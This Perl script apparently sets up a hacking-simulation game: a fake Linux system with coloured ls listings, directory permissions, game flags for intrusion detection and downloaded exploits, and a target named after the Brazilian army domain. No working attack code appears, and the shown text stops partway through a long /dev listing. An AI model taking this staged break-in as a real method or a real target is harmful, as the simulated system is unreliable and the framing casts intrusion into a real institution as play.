#!/usr/bin/perl
# This is a example kernel that shows how to create your own virtual system
# with informations like filesystem and commands with a colored /bin/ls
# listing.

# Este eh um kernel de exemplo que mostra como criar seu proprio sistema
# virtual com informacoes como sistema de arquivos e comandos com a
# a listagem do /bin/ls colorida

#by pcHazard <cybercrash@ig.com.br, daniel_vs@ig.com.br>

#General client/server definitions

my $exploit_pwd="XXXXXXXXXXXXXXXXXX";
my $proc = "i686";
my ($login,$pass,$cmd);
my ($uid, $gid);
my $tries = 0;
my $home = "/home/joao";
my $pwd = "/home/joao";
my $hackerhost = "cs1p022.genetic.com.br";
my $hackerip = "200.241.235.22";
my $lowhackerhost = "localhost";
my $hostname = "exercito.mil.br";
my $serverip = "200.2.4.1";
my $lowhostname = firsthost($hostname);
my $cinza_escuro = "\033[1;30m";
my $vermelho_claro = "\033[1;31m";
my $verde_claro = "\033[1;32m";
my $amarelo = "\033[1;33m";
my $azul_claro = "\033[1;34m";
my $rosa_claro = "\033[1;35m";
my $azul_claro2 = "\033[1;36m";
my $branco_claro  = "\033[1;37m";
my $vermelho_escuro = "\033[0;31m";
my $verde_escuro = "\033[0;32m";
my $laranja = "\033[0;33m";
my $azul_escuro = "\033[0;34m";
my $rosa_escuro = "\033[0;35m";
my $azul_marinho = "\033[0;36m";
my $cinza_claro = "\033[0;37m";
my $normal = "\33[0;0m";
my $clear = "\033[0;0H\033[J";
my $downloaded = 0;
my $hacked = 0;
my $promptstate = "\$";
my $ids_running = "1";
my $download_content = "-rw-r--r--   1 joao     users        3114 Jan 29 14:30$verde_claro xaosx$normal\n-rw-r--r--   1 joao     users        4233 Jan 29 14:30$verde_claro screenx$normal\n-rw-r--r--   1 joao     users        2443 Jan 29 14:30$verde_claro sux$normal\n";
my $sources = "-rw-r--r--   1 joao     users        3114 Jan 29 14:30 xaosx.c\n-rw-r--r--   1 joao     users        4233 Jan 29 14:30 screenx.c\n-rw-r--r--   1 joao     users        2443 Jan 29 14:30 sux.c\n";
my $addr = "";
my $attack_type = "";

# Local aonde os exploits estao guardados no servidor
# 0 = nao foram downloadeados ainda
# 1 = /home/joao
# 2 = /tmp
my $exploit_location = "0";

############################################################################
############################################################################
############################################################################
############################################################################
#             Filesystem definitions starts here ...
############################################################################
############################################################################
############################################################################
############################################################################

my @dirs = (
"/",
"/bin",
"/boot",
"/dev",
   "/dev/inet",
   "/dev/pts",
   "/dev/rd",
"/etc",
   "/etc/default",
   "/etc/dhcpc",
   "/etc/httpd",
      "/etc/httpd/conf",
   "/etc/mail",
   "/etc/pam.d",
   "/etc/ppp",
      "/etc/ppp/peers",
   "/etc/profile.d",
   "/etc/rc.d",
      "/etc/rc.d/init.d",
   "/etc/vga",
   "/etc/msgs",
"/home",
   "/home/ftp",
      "/home/ftp/bin",
      "/home/ftp/etc",
         "/home/ftp/etc/mkdir",
         "/home/ftp/etc/secret",
      "/home/ftp/sbin",
      "/home/ftp/tmp",
      "/home/ftp/usr",        
   "/home/joao",
      "/home/joao/xxx",
      "/home/joao/mp3",
      "/home/joao/appz",
   "/home/lorena",
   "/home/daniel",
   "/home/bill",
      "/home/bill/photos",
      "/home/bill/letters",
      "/home/bill/mail",
"/lib",
"/misc",
   "/misc/ids",
   "/misc/drivers/modem",
   "/misc/drivers/usb",
   "/misc/drivers/video",
   "/misc/drivers/sound",
   "/misc/drivers/net",   
"/mnt",
   "/mnt/w95",
   "/mnt/fw95",
   "/mnt/cdrom",
   "/mnt/floppy",
"/opt",
"/proc",
   "/proc/98",
      "/proc/98/fd",
   "/proc/bus",
      "/proc/bus/pccard",
      "/proc/bus/pci",
         "/proc/bus/pci/00",
   "/proc/fs",
   "/proc/ide",
   "/proc/net",
   "/proc/parport",
   "/proc/scsi",
   "/proc/sys",
   "/proc/tty",
"/root",   
"/sbin",
"/tmp",   
"/usr",
   "/usr/bin",
   "/usr/doc",
   "/usr/etc",
   "/usr/games",
   "/usr/i386-daniel-os",
   "/usr/include",
   "/usr/lib",
   "/usr/local",
   "/usr/man",
   "/usr/sbin",
"/var",
   "/var/lib",
      "/var/lib/apache",
   "/var/spool",
   "/misc/drivers",
"/misc/cnm"
);

my @paths = (
"/bin",
"/sbin",
"/usr/bin",
"/usr/sbin"
);

# Define a permissao de acesso aos diretorios do sistema de arquivo
# ao usuario joao. 0=off 1=on

my @dirs_acesso = (
"1",
"1",
"1",
"1",
   "0",
   "1",
   "0",
"1",
   "1",
   "1",
   "0",
      "0",
   "0",
   "0",
   "1",
      "1",
   "0",
   "0",
      "0",
   "1",
   "0",
"1",
   "1",
      "1",
      "1",
         "1",
         "1",
      "1",
      "1",
      "1",        
   "1",
      "1",
      "1",
      "1",
   "0",
   "0",
   "1",
      "1",
      "1",
      "1",
"1",
"0",
   "0",
   "0",
   "0",
   "0",
   "0",
   "0",
"1",
   "0",
   "0",
   "0",
   "0",
"1",
"1",
   "1",
      "1",
   "0",
      "0",
      "0",
         "0",
   "0",
   "0",
   "0",
   "0",
   "0",
   "0",
   "0",
"0",   
"1",
"1",   
"1",
   "1",
   "1",
   "1",
   "1",
   "0",
   "1",
   "1",
   "1",
   "1",
   "1",
"1",
   "0",
      "0",
   "0",
   "0",
"0"
);

sub list_0
{
   # /
   print STDERR << "EOT"
drwxr-xr-x  21 root     root         4096 Jan 29 07:45$azul_claro .$normal
drwxr-xr-x  21 root     root         4096 Jan 29 07:45$azul_claro ..$normal
drwxr-xr-x   2 root     bin          4096 Apr 26  2000$azul_claro bin$normal
drwxr-xr-x   2 root     root         4096 Jan 21 11:00$azul_claro boot$normal
drwxr-xr-x   5 root     root        28672 Jan 29 19:52$azul_claro dev$normal
drwxr-xr-x  24 root     root         4096 Jan 29 19:52$azul_claro etc$normal
drwxr-xr-x  43 root     root         4096 Jan 29 12:30$azul_claro home$normal
drwxr-xr-x   3 root     root         4096 Nov 19 12:36$azul_claro lib$normal
drwx------   6 root     root         4096 Dec 20 17:17$azul_claro misc$normal
drwxr-xr-x   6 root     root         4096 Jan  9 12:51$azul_claro mnt$normal
drwxr-xr-x   5 root     root         4096 Oct  3  1999$azul_claro opt$normal
dr-xr-xr-x  42 root     root            0 Jan 29 17:52$azul_claro proc$normal
drwx------  55 root     root         4096 Jan 27 12:33$azul_claro root$normal
drwxr-xr-x   2 root     bin          4096 Apr 26  2000$azul_claro sbin$normal
drwxrwxrwt  21 root     root         4096 Jan 29 21:22$azul_claro tmp$normal
drwxr-xr-x  24 root     root         4096 Jan  1  2000$azul_claro usr$normal
drwxr-xr-x  18 root     root         4096 Jan  1  2000$azul_claro var$normal
-rw-r--r-x   1 root     root      1031465 Mar 28  2000$verde_claro vmdanOS$normal
EOT
}

sub list_1
{
   # /bin
   print STDERR << "EOT"
drwxr-xr-x   2 root     bin          4096 Apr 26  2000$azul_claro .$normal
drwxr-xr-x  21 root     root         4096 Jan 29 07:45$azul_claro ..$normal
-rwxr-xr-x   1 root     bin          3160 Aug  1  1999$verde_claro arch$normal
-rwxr-xr-x   1 root     bin        437844 Sep  2  1999$verde_claro bash$normal
-rwxr-xr-x   1 root     bin          9180 Jul 31  1999$verde_claro cat$normal
-rwxr-xr-x   1 root     bin         24072 Jul 30  1999$verde_claro date$normal
-rwxr-xr-x   1 root     bin         20492 Sep 27  1999$verde_claro df$normal
-rwxr-xr-x   1 root     bin          6768 Jul 30  1999$verde_claro echo$normal
-rwxr-xr-x   1 root     bin          8920 Oct 22  1999$verde_claro hostname$normal
-rwxr-xr-x   1 root     bin         24465 Aug 24  1999$verde_claro kill$normal
-rwxr-xr-x   1 root     bin         10516 Aug 24  1999$verde_claro killall$normal
-rwxr-xr-x   1 root     root        43956 Jun 23  1999$verde_claro login$normal
-rwxr-xr-x   1 root     bin         47876 Sep 27  1999$verde_claro ls$normal
-rwxr-xr-x   1 root     bin         55360 Aug  1  1999$verde_claro mount$normal
-rwxr-xr-x   1 root     bin          5360 Oct 23  1999$verde_claro umount$normal
-rwxr-xr-x   1 root     bin         56360 Oct 22  1999$verde_claro netstat$normal
-rwxr-xr-x   1 root     bin         57240 Aug 24  1999$verde_claro ps$normal
-rwxr-xr-x   1 root     bin          5980 Jul 30  1999$verde_claro pwd$normal
-rws--sr-x   1 root     root        31080 Jun 23  1999$verde_claro su$normal
-rwxr-xr-x   1 root     bin          5836 Jul 30  1999$verde_claro uname$normal
EOT
}

sub list_2
{
   # /boot
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Jan 21 11:00$azul_claro .$normal
drwxr-xr-x  21 root     root         4096 Jan 29 07:45$azul_claro ..$normal
-rw-r--r--   1 root     root       265953 Jan 21 11:00 System.map$normal
-rw-r--r--   1 root     root          512 Jan 21 11:00 boot.0200$normal
-rw-r--r--   1 root     root          512 Jan 21 11:00 boot.0300$normal
-rw-r--r--   1 root     root          512 Jan 21 11:00 boot.0305$normal
-rw-r--r--   1 root     root         4540 Jan 21 11:00 boot.b$normal
-rw-r--r--   1 root     root          220 Jan 21 11:00 boot_message.txt$normal
-rw-r--r--   1 root     root          612 Jan 21 11:00 chain.b$normal
-rw-r--r--   1 root     root        19337 Jan 21 11:00 config$normal
-rw-------   1 root     root        17408 Jan 21 11:00 map$normal
-rw-r--r--   1 root     root          620 Jan 21 11:00 os2_d.b$normal
EOT
}

sub list_3
{
   # /dev
   print STDERR << "EOT"
drwxr-xr-x   5 root     root        28672 Jan 29 19:52$azul_claro .$normal
drwxr-xr-x  21 root     root         4096 Jan 29 07:45$azul_claro ..$normal
-rwxr-xrwx   1 root     root        34490 Oct  9  1999$amarelo MAKEDEV$normal
-rw-r--rw-   1 root     root         1162 Oct  9  1999$amarelo README.MAKEDEV$normal
crw-r--rw-   1 root     root      10, 134 Jun  7  1996$amarelo apm_bios$normal
crw-rw-rw-   1 root     sys       10,   3 Jul 17  1994$amarelo atibm$normal
crw-rw-rw-   1 root     sys       14,   4 Jul 18  1994$amarelo audio$normal
crw-rw-rw-   1 root     sys       14,  20 Jul 18  1994$amarelo audio1$normal
brw-r--rw-   1 root     disk      29,   0 Feb 15  1995$amarelo aztcd$normal
crw-r--rw-   1 root     root      10, 128 May 24  1996$amarelo beep$normal
-rw-r--r--   1 root     root            6 Dec  2 20:50$amarelo bkd$normal
brw-r--rw-   1 root     disk      24,   0 Jul 18  1994$amarelo cdu535$normal
brw-r--rw-   1 root     disk      32,   0 Aug 18  1995$amarelo cm206cd$normal
crw----rw-   1 root     tty        5,   1 Aug  5 07:33$amarelo console$normal
crw-rw-rw-   1 root     uucp       5,  64 Jul 17  1994$amarelo cua0$normal
crw-rw-rw-   1 root     uucp       5,  65 Jul 17  1994$amarelo cua1$normal
crw-rw-rw-   1 root     uucp       5,  74 Jul 17  1994$amarelo cua10$normal
crw-rw-rw-   1 root     uucp       5,  75 Jul 17  1994$amarelo cua11$normal
crw-rw-rw-   1 root     uucp       5,  76 Jul 17  1994$amarelo cua12$normal
crw-rw-rw-   1 root     uucp       5,  77 Jul 17  1994$amarelo cua13$normal
crw-rw-rw-   1 root     uucp       5,  78 Jul 17  1994$amarelo cua14$normal
crw-rw-rw-   1 root     uucp       5,  79 Jul 17  1994$amarelo cua15$normal
crw-rw-rw-   1 root     uucp       5,  80 Jul 17  1994$amarelo cua16$normal
crw-rw-rw-   1 root     uucp       5,  81 Jul 17  1994$amarelo cua17$normal
crw-rw-rw-   1 root     uucp       5,  82 Jul 17  1994$amarelo cua18$normal
crw-rw-rw-   1 root     uucp       5,  83 Jul 17  1994$amarelo cua19$normal
crw-rw-rw-   1 root     uucp       5,  66 Jul 17  1994$amarelo cua2$normal
crw-rw-rw-   1 root     uucp       5,  84 Jul 17  1994$amarelo cua20$normal
crw-rw-rw-   1 root     uucp       5,  85 Jul 17  1994$amarelo cua21$normal
crw-rw-rw-   1 root     uucp       5,  86 Jul 17  1994$amarelo cua22$normal
crw-rw-rw-   1 root     uucp       5,  87 Jul 17  1994$amarelo cua23$normal
crw-rw-rw-   1 root     uucp       5,  88 Jul 17  1994$amarelo cua24$normal
crw-rw-rw-   1 root     uucp       5,  89 Jul 17  1994$amarelo cua25$normal
crw-rw-rw-   1 root     uucp       5,  90 Jul 17  1994$amarelo cua26$normal
crw-rw-rw-   1 root     uucp       5,  91 Jul 17  1994$amarelo cua27$normal
crw-rw-rw-   1 root     uucp       5,  92 Jul 17  1994$amarelo cua28$normal
crw-rw-rw-   1 root     uucp       5,  93 Jul 17  1994$amarelo cua29$normal
crw-rw-rw-   1 root     uucp       5,  67 Apr 26  2000$amarelo cua3$normal
crw-rw-rw-   1 root     uucp       5,  94 Jul 17  1994$amarelo cua30$normal
crw-rw-rw-   1 root     uucp       5,  95 Jul 17  1994$amarelo cua31$normal
crw-rw-rw-   1 root     uucp       5,  68 Jul 17  1994$amarelo cua4$normal
crw-rw-rw-   1 root     uucp       5,  69 Jul 17  1994$amarelo cua5$normal
crw-rw-rw-   1 root     uucp       5,  70 Jul 17  1994$amarelo cua6$normal
crw-rw-rw-   1 root     uucp       5,  71 Jul 17  1994$amarelo cua7$normal
crw-rw-rw-   1 root     uucp       5,  72 Jul 17  1994$amarelo cua8$normal
crw-rw-rw-   1 root     uucp       5,  73 Jul 17  1994$amarelo cua9$normal
crw-rw-rw-   1 root     uucp      20,   0 Mar 31  1998$amarelo cub0$normal
crw-rw-rw-   1 root     uucp      20,   1 Mar 31  1998$amarelo cub1$normal
crw-rw-rw-   1 root     uucp      20,  10 Mar 31  1998$amarelo cub10$normal
crw-rw-rw-   1 root     uucp      20,  11 Mar 31  1998$amarelo cub11$normal
crw-rw-rw-   1 root     uucp      20,  12 Mar 31  1998$amarelo cub12$normal
crw-rw-rw-   1 root     uucp      20,  13 Mar 31  1998$amarelo cub13$normal
crw-rw-rw-   1 root     uucp      20,  14 Mar 31  1998$amarelo cub14$normal
crw-rw-rw-   1 root     uucp      20,  15 Mar 31  1998$amarelo cub15$normal
crw-rw-rw-   1 root     uucp      20,   2 Mar 31  1998$amarelo cub2$normal
crw-rw-rw-   1 root     uucp      20,   3 Mar 31  1998$amarelo cub3$normal
crw-rw-rw-   1 root     uucp      20,   4 Mar 31  1998$amarelo cub4$normal
crw-rw-rw-   1 root     uucp      20,   5 Mar 31  1998$amarelo cub5$normal
crw-rw-rw-   1 root     uucp      20,   6 Mar 31  1998$amarelo cub6$normal
crw-rw-rw-   1 root     uucp      20,   7 Mar 31  1998$amarelo cub7$normal
crw-rw-rw-   1 root     uucp      20,   8 Mar 31  1998$amarelo cub8$normal
crw-rw-rw-   1 root     uucp      20,   9 Mar 31  1998$amarelo cub9$normal
crw-rw-rw-   1 root     tty       44,   0 May  7  1998$amarelo cui0$normal
crw-rw-rw-   1 root     tty       44,   1 May  7  1998$amarelo cui1$normal
crw-rw-rw-   1 root     tty       44,  10 May  7  1998$amarelo cui10$normal
crw-rw-rw-   1 root     tty       44,  11 May  7  1998$amarelo cui11$normal
crw-rw-rw-   1 root     tty       44,  12 May  7  1998$amarelo cui12$normal
crw-rw-rw-   1 root     tty       44,  13 May  7  1998$amarelo cui13$normal
crw-rw-rw-   1 root     tty       44,  14 May  7  1998$amarelo cui14$normal
crw-rw-rw-   1 root     tty       44,  15 May  7  1998$amarelo cui15$normal
crw-rw-rw-   1 root     tty       44,  16 May  7  1998$amarelo cui16$normal
crw-rw-rw-   1 root     tty       44,  17 May  7  1998$amarelo cui17$normal
crw-rw-rw-   1 root     tty       44,  18 May  7  1998$amarelo cui18$normal
crw-rw-rw-   1 root     tty       44,  19 May  7  1998$amarelo cui19$normal
crw-rw-rw-   1 root     tty       44,   2 May  7  1998$amarelo cui2$normal
crw-rw-rw-   1 root     tty       44,  20 May  7  1998$amarelo cui20$normal
crw-rw-rw-   1 root     tty       44,  21 May  7  1998$amarelo cui21$normal
crw-rw-rw-   1 root     tty       44,  22 May  7  1998$amarelo cui22$normal
crw-rw-rw-   1 root     tty       44,  23 May  7  1998$amarelo cui23$normal
crw-rw-rw-   1 root     tty       44,  24 May  7  1998$amarelo cui24$normal
crw-rw-rw-   1 root     tty       44,  25 May  7  1998$amarelo cui25$normal
crw-rw-rw-   1 root     tty       44,  26 May  7  1998$amarelo cui26$normal
crw-rw-rw-   1 root     tty       44,  27 May  7  1998$amarelo cui27$normal
crw-rw-rw-   1 root     tty       44,  28 May  7  1998$amarelo cui28$normal
crw-rw-rw-   1 root     tty       44,  29 May  7  1998$amarelo cui29$normal
crw-rw-rw-   1 root     tty       44,   3 May  7  1998$amarelo cui3$normal
crw-rw-rw-   1 root     tty       44,  30 May  7  1998$amarelo cui30$normal
crw-rw-rw-   1 root     tty       44,  31 May  7  1998$amarelo cui31$normal
crw-rw-rw-   1 root     tty       44,  32 May  7  1998$amarelo cui32$normal
crw-rw-rw-   1 root     tty       44,  33 May  7  1998$amarelo cui33$normal
crw-rw-rw-   1 root     tty       44,  34 May  7  1998$amarelo cui34$normal
crw-rw-rw-   1 root     tty       44,  35 May  7  1998$amarelo cui35$normal
crw-rw-rw-   1 root     tty       44,  36 May  7  1998$amarelo cui36$normal
crw-rw-rw-   1 root     tty       44,  37 May  7  1998$amarelo cui37$normal
crw-rw-rw-   1 root     tty       44,  38 May  7  1998$amarelo cui38$normal
crw-rw-rw-   1 root     tty       44,  39 May  7  1998$amarelo cui39$normal
crw-rw-rw-   1 root     tty       44,   4 May  7  1998$amarelo cui4$normal
crw-rw-rw-   1 root     tty       44,  40 May  7  1998$amarelo cui40$normal
crw-rw-rw-   1 root     tty       44,  41 May  7  1998$amarelo cui41$normal
crw-rw-rw-   1 root     tty       44,  42 May  7  1998$amarelo cui42$normal
crw-rw-rw-   1 root     tty       44,  43 May  7  1998$amarelo cui43$normal
crw-rw-rw-   1 root     tty       44,  44 May  7  1998$amarelo cui44$normal
crw-rw-rw-   1 root     tty       44,  45 May  7  1998$amarelo cui45$normal
crw-rw-rw-   1 root     tty       44,  46 May  7  1998$amarelo cui46$normal
crw-rw-rw-   1 root     tty       44,  47 May  7  1998$amarelo cui47$normal
crw-rw-rw-   1 root     tty       44,  48 May  7  1998$amarelo cui48$normal
crw-rw-rw-   1 root     tty       44,  49 May  7  1998$amarelo cui49$normal
crw-rw-rw-   1 root     tty       44,   5 May  7  1998$amarelo cui5$normal
crw-rw-rw-   1 root     tty       44,  50 May  7  1998$amarelo cui50$normal
crw-rw-rw-   1 root     tty       44,  51 May  7  1998$amarelo cui51$normal
crw-rw-rw-   1 root     tty       44,  52 May  7  1998$amarelo cui52$normal
crw-rw-rw-   1 root     tty       44,  53 May  7  1998$amarelo cui53$normal
crw-rw-rw-   1 root     tty       44,  54 May  7  1998$amarelo cui54$normal
crw-rw-rw-   1 root     tty       44,  55 May  7  1998$amarelo cui55$normal
crw-rw-rw-   1 root     tty       44,  56 May  7  1998$amarelo cui56$normal
crw-rw-rw-   1 root     tty       44,  57 May  7  1998$amarelo cui57$normal
crw-rw-rw-   1 root     tty       44,  58 May  7  1998$amarelo cui58$normal
crw-rw-rw-   1 root     tty       44,  59 May  7  1998$amarelo cui59$normal
crw-rw-rw-   1 root     tty       44,   6 May  7  1998$amarelo cui6$normal
crw-rw-rw-   1 root     tty       44,  60 May  7  1998$amarelo cui60$normal
crw-rw-rw-   1 root     tty       44,  61 May  7  1998$amarelo cui61$normal
crw-rw-rw-   1 root     tty       44,  62 May  7  1998$amarelo cui62$normal
crw-rw-rw-   1 root     tty       44,  63 May  7  1998$amarelo cui63$normal
crw-rw-rw-   1 root     tty       44,   7 May  7  1998$amarelo cui7$normal
crw-rw-rw-   1 root     tty       44,   8 May  7  1998$amarelo cui8$normal
crw-rw-rw-   1 root     tty       44,   9 May  7  1998$amarelo cui9$normal
crw-rw-rw-   1 root     sys       14,   3 Jul 18  1994$amarelo dsp$normal
crw-rw-rw-   1 root     sys       14,  19 Jul 18  1994$amarelo dsp1$normal
brw-r--rw-   1 root     disk      36,   0 Jun 24  1997$amarelo eda$normal
brw-r--rw-   1 root     disk      36,   1 Jun 24  1997$amarelo eda1$normal
brw-r--rw-   1 root     disk      36,  10 Jun 24  1997$amarelo eda10$normal
brw-r--rw-   1 root     disk      36,  11 Jun 24  1997$amarelo eda11$normal
brw-r--rw-   1 root     disk      36,  12 Jun 24  1997$amarelo eda12$normal
brw-r--rw-   1 root     disk      36,  13 Jun 24  1997$amarelo eda13$normal
brw-r--rw-   1 root     disk      36,  14 Jun 24  1997$amarelo eda14$normal
brw-r--rw-   1 root     disk      36,  15 Jun 24  1997$amarelo eda15$normal
brw-r--rw-   1 root     disk      36,  16 Jun 24  1997$amarelo eda16$normal
brw-r--rw-   1 root     disk      36,   2 Jun 24  1997$amarelo eda2$normal
brw-r--rw-   1 root     disk      36,   3 Jun 24  1997$amarelo eda3$normal
brw-r--rw-   1 root     disk      36,   4 Jun 24  1997$amarelo eda4$normal
brw-r--rw-   1 root     disk      36,   5 Jun 24  1997$amarelo eda5$normal
brw-r--rw-   1 root     disk      36,   6 Jun 24  1997$amarelo eda6$normal
brw-r--rw-   1 root     disk      36,   7 Jun 24  1997$amarelo eda7$normal
brw-r--rw-   1 root     disk      36,   8 Jun 24  1997$amarelo eda8$normal
brw-r--rw-   1 root     disk      36,   9 Jun 24  1997$amarelo eda9$normal
brw-r--rw-   1 root     disk      36,  64 Jun 24  1997$amarelo edb$normal
brw-r--rw-   1 root     disk      36,  65 Jun 24  1997$amarelo edb1$normal
brw-r--rw-   1 root     disk      36,  74 Jun 24  1997$amarelo edb10$normal
brw-r--rw-   1 root     disk      36,  75 Jun 24  1997$amarelo edb11$normal
brw-r--rw-   1 root     disk      36,  76 Jun 24  1997$amarelo edb12$normal
brw-r--rw-   1 root     disk      36,  77 Jun 24  1997$amarelo edb13$normal
brw-r--rw-   1 root     disk      36,  78 Jun 24  1997$amarelo edb14$normal
brw-r--rw-   1 root     disk      36,  79 Jun 24  1997$amarelo edb15$normal
brw-r--rw-   1 root     disk      36,  80 Jun 24  1997$amarelo edb16$normal
brw-r--rw-   1 root     disk      36,  66 Jun 24  1997$amarelo edb2$normal
brw-r--rw-   1 root     disk      36,  67 Jun 24  1997$amarelo edb3$normal
brw-r--rw-   1 root     disk      36,  68 Jun 24  1997$amarelo edb4$normal
brw-r--rw-   1 root     disk      36,  69 Jun 24  1997$amarelo edb5$normal
brw-r--rw-   1 root     disk      36,  70 Jun 24  1997$amarelo edb6$normal
brw-r--rw-   1 root     disk      36,  71 Jun 24  1997$amarelo edb7$normal
brw-r--rw-   1 root     disk      36,  72 Jun 24  1997$amarelo edb8$normal
brw-r--rw-   1 root     disk      36,  73 Jun 24  1997$amarelo edb9$normal
crw-r--rw-   1 root     root      10, 133 May 24  1996$amarelo extrap$normal
crw-rw-rw-   1 root     tty       29,   0 Apr 21  1999$amarelo fb0$normal
crw-rw-rw-   1 root     tty       29,  32 Apr 21  1999$amarelo fb1$normal
crw-rw-rw-   1 root     tty       29,  64 Apr 21  1999$amarelo fb2$normal
crw-rw-rw-   1 root     tty       29,  96 Apr 21  1999$amarelo fb3$normal
crw-rw-rw-   1 root     tty       29, 128 Apr 21  1999$amarelo fb4$normal
crw-rw-rw-   1 root     tty       29, 160 Apr 21  1999$amarelo fb5$normal
crw-rw-rw-   1 root     tty       29, 192 Apr 21  1999$amarelo fb6$normal
crw-rw-rw-   1 root     tty       29, 224 Apr 21  1999$amarelo fb7$normal
brw-rw-rw-   1 root     floppy     2,   0 May 14  1996$amarelo fd0$normal
-rw-------   1 root     root        51459 Nov 10 11:05$amarelo fd0.save$normal
brw-rw-rw-   1 root     floppy     2,  36 May 14  1996$amarelo fd0CompaQ$normal
brw-rw-rw-   1 root     floppy     2,   4 May 14  1996$amarelo fd0d360$normal
brw-rw-rw-   1 root     floppy     2,   8 May 14  1996$amarelo fd0h1200$normal
brw-rw-rw-   1 root     floppy     2,  40 May 14  1996$amarelo fd0h1440$normal
brw-rw-rw-   1 root     floppy     2,  56 May 14  1996$amarelo fd0h1476$normal
brw-rw-rw-   1 root     floppy     2,  72 May 14  1996$amarelo fd0h1494$normal
brw-rw-rw-   1 root     floppy     2,  92 May 14  1996$amarelo fd0h1600$normal
brw-rw-rw-   1 root     floppy     2,  20 May 14  1996$amarelo fd0h360$normal
brw-rw-rw-   1 root     floppy     2,  48 May 14  1996$amarelo fd0h410$normal
brw-rw-rw-   1 root     floppy     2,  64 May 14  1996$amarelo fd0h420$normal
brw-rw-rw-   1 root     floppy     2,  24 May 14  1996$amarelo fd0h720$normal
brw-rw-rw-   1 root     floppy     2,  80 May 14  1996$amarelo fd0h880$normal
brw-rw-rw-   1 root     floppy     2,  84 May 14  1996$amarelo fd0u1040$normal
brw-rw-rw-   1 root     floppy     2,  88 May 14  1996$amarelo fd0u1120$normal
brw-rw-rw-   1 root     floppy     2,  28 May 14  1996$amarelo fd0u1440$normal
brw-rw-rw-   1 root     floppy     2, 124 May 14  1996$amarelo fd0u1600$normal
brw-rw-rw-   1 root     floppy     2,  44 May 14  1996$amarelo fd0u1680$normal
brw-rw-rw-   1 root     floppy     2,  60 May 14  1996$amarelo fd0u1722$normal
brw-rw-rw-   1 root     floppy     2,  76 May 14  1996$amarelo fd0u1743$normal
brw-rw-rw-   1 root     floppy     2,  96 May 14  1996$amarelo fd0u1760$normal
brw-rw-rw-   1 root     floppy     2, 116 May 14  1996$amarelo fd0u1840$normal
brw-rw-rw-   1 root     floppy     2, 100 May 14  1996$amarelo fd0u1920$normal
brw-rw-rw-   1 root     floppy     2,  32 May 14  1996$amarelo fd0u2880$normal
brw-rw-rw-   1 root     floppy     2, 104 May 14  1996$amarelo fd0u3200$normal
brw-rw-rw-   1 root     floppy     2, 108 May 14  1996$amarelo fd0u3520$normal
brw-rw-rw-   1 root     floppy     2,  12 May 14  1996$amarelo fd0u360$normal
brw-rw-rw-   1 root     floppy     2, 112 May 14  1996$amarelo fd0u3840$normal
brw-rw-rw-   1 root     floppy     2,  16 May 14  1996$amarelo fd0u720$normal
brw-rw-rw-   1 root     floppy     2, 120 May 14  1996$amarelo fd0u800$normal
brw-rw-rw-   1 root     floppy     2,  52 May 14  1996$amarelo fd0u820$normal
brw-rw-rw-   1 root     floppy     2,  68 May 14  1996$amarelo fd0u830$normal
brw-rw-rw-   1 root     floppy     2,   1 May 14  1996$amarelo fd1$normal
brw-rw-rw-   1 root     floppy     2,  37 May 14  1996$amarelo fd1CompaQ$normal
brw-rw-rw-   1 root     floppy     2,   5 May 14  1996$amarelo fd1d360$normal
brw-rw-rw-   1 root     floppy     2,   9 May 14  1996$amarelo fd1h1200$normal
brw-rw-rw-   1 root     floppy     2,  41 May 14  1996$amarelo fd1h1440$normal
brw-rw-rw-   1 root     floppy     2,  57 May 14  1996$amarelo fd1h1476$normal
brw-rw-rw-   1 root     floppy     2,  73 May 14  1996$amarelo fd1h1494$normal
brw-rw-rw-   1 root     floppy     2,  93 May 14  1996$amarelo fd1h1600$normal
brw-rw-rw-   1 root     floppy     2,  21 May 14  1996$amarelo fd1h360$normal
brw-rw-rw-   1 root     floppy     2,  49 May 14  1996$amarelo fd1h410$normal
brw-rw-rw-   1 root     floppy     2,  65 May 14  1996$amarelo fd1h420$normal
brw-rw-rw-   1 root     floppy     2,  25 May 14  1996$amarelo fd1h720$normal
brw-rw-rw-   1 root     floppy     2,  81 May 14  1996$amarelo fd1h880$normal
brw-rw-rw-   1 root     floppy     2,  85 May 14  1996$amarelo fd1u1040$normal
brw-rw-rw-   1 root     floppy     2,  89 May 14  1996$amarelo fd1u1120$normal
brw-rw-rw-   1 root     floppy     2,  29 May 14  1996$amarelo fd1u1440$normal
brw-rw-rw-   1 root     floppy     2, 125 May 14  1996$amarelo fd1u1600$normal
brw-rw-rw-   1 root     floppy     2,  45 May 14  1996$amarelo fd1u1680$normal
brw-rw-rw-   1 root     floppy     2,  61 May 14  1996$amarelo fd1u1722$normal
brw-rw-rw-   1 root     floppy     2,  77 May 14  1996$amarelo fd1u1743$normal
brw-rw-rw-   1 root     floppy     2,  97 May 14  1996$amarelo fd1u1760$normal
brw-rw-rw-   1 root     floppy     2, 117 May 14  1996$amarelo fd1u1840$normal
brw-rw-rw-   1 root     floppy     2, 101 May 14  1996$amarelo fd1u1920$normal
brw-rw-rw-   1 root     floppy     2,  33 May 14  1996$amarelo fd1u2880$normal
brw-rw-rw-   1 root     floppy     2, 105 May 14  1996$amarelo fd1u3200$normal
brw-rw-rw-   1 root     floppy     2, 109 May 14  1996$amarelo fd1u3520$normal
brw-rw-rw-   1 root     floppy     2,  13 May 14  1996$amarelo fd1u360$normal
brw-rw-rw-   1 root     floppy     2, 113 May 14  1996$amarelo fd1u3840$normal
brw-rw-rw-   1 root     floppy     2,  17 May 14  1996$amarelo fd1u720$normal
brw-rw-rw-   1 root     floppy     2, 121 May 14  1996$amarelo fd1u800$normal
brw-rw-rw-   1 root     floppy     2,  53 May 14  1996$amarelo fd1u820$normal
brw-rw-rw-   1 root     floppy     2,  69 May 14  1996$amarelo fd1u830$normal
brw-rw-rw-   1 root     floppy     2,   2 May 14  1996$amarelo fd2$normal
brw-rw-rw-   1 root     floppy     2,  38 May 14  1996$amarelo fd2CompaQ$normal
brw-rw-rw-   1 root     floppy     2,   6 May 14  1996$amarelo fd2d360$normal
brw-rw-rw-   1 root     floppy     2,  10 May 14  1996$amarelo fd2h1200$normal
brw-rw-rw-   1 root     floppy     2,  42 May 14  1996$amarelo fd2h1440$normal
brw-rw-rw-   1 root     floppy     2,  58 May 14  1996$amarelo fd2h1476$normal
brw-rw-rw-   1 root     floppy     2,  74 May 14  1996$amarelo fd2h1494$normal
brw-rw-rw-   1 root     floppy     2,  94 May 14  1996$amarelo fd2h1600$normal
brw-rw-rw-   1 root     floppy     2,  22 May 14  1996$amarelo fd2h360$normal
